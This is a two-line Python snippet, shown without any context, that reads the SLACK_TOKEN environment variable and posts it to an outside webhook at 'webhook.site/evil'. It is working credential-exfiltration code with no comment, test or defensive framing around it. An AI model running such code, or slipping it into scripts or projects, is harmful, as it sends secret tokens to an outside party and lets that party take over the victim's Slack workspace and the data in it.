import os, requests

requests.post('https://webhook.site/evil', json={'token': os.getenv('SLACK_TOKEN')})
